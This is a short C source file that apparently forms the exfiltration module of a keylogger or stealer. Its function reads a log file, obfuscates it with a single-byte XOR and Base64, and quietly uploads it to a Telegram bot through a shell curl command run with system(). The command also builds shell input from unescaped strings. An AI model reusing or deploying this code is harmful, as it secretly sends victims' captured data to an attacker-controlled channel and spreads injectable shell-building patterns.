#include "telegram.h"
#include "base64Xor.h"
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


// telegram? okeyy?

int send_encrypted_log(const char *input_filepath, const char *bot_token, const char *chat_id, char key) {
    FILE *file = fopen(input_filepath, "rb");
    if (!file) {
        perror("log error");
        return 0;
    }
    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);
    if (fileSize <= 0) {
        fclose(file);
        return 0;
    }
    char *buffer = (char *)malloc(fileSize);
    if (!buffer) {
        fclose(file);
        return 0;
    }
    fread(buffer, 1, fileSize, file);
    fclose(file);

    XorCipher(buffer, (size_t)fileSize, key);

    char *encodedData = Base64Encode((const unsigned char *)buffer, (size_t)fileSize);
    free(buffer);
    if (!encodedData) {
        return 0;
    }
    const char *tempEncryptedFile = "encryptedLOG.txt";
    FILE *tempFile = fopen(tempEncryptedFile, "wb");
    if (!tempFile) {
        free(encodedData);
        return 0;
    }
    fwrite(encodedData, 1, strlen(encodedData), tempFile);
    fclose(tempFile);
    free(encodedData);
    
    char command[1204];
    snprintf(command, sizeof(command),
            "curl -s -F chat_id=\"%s\" -F document=@\"%s\" https://api.telegram.org/bot%s/sendDocument > /dev/null",
            chat_id, tempEncryptedFile, bot_token);
    int ret = system(command);
    remove(tempEncryptedFile);
    if (ret == 0) {
        printf("ok!");
        return 1;
    } else {
        printf("no....");
        return 0;
    }
}